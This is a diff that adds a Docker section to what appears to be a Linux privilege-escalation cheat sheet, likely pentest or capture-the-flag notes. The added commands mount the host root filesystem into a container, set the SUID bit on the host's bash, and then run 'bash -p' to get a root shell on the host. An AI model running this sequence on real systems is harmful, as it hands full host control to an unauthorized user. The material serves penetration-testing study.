@@ -325,6 +325,41 @@ Enumerate capabilities in general with:
 getcap -r / 2>/dev/null
 ```
 
+## Container
+
+### Docker
+
+Enumerate the docker images:
+
+```text
+docker ps
+```
+
+We can use an existing image to create a container and mount the root file system in the container:
+
+```text
+docker run --rm -it -v /:/mnt username bash
+cd /mnt/root/
+```
+
+Escalate privileges in the container:
+
+```text
+cd /mnt/bin
+chmod 4755 bash
+exit
+```
+
+Escalate privileges in the host \(not container\):
+
+```text
+bash -p
+whoami
+
+# Expected Output
+root
+```
+
 ## Misc
 
 ### Git Repositories
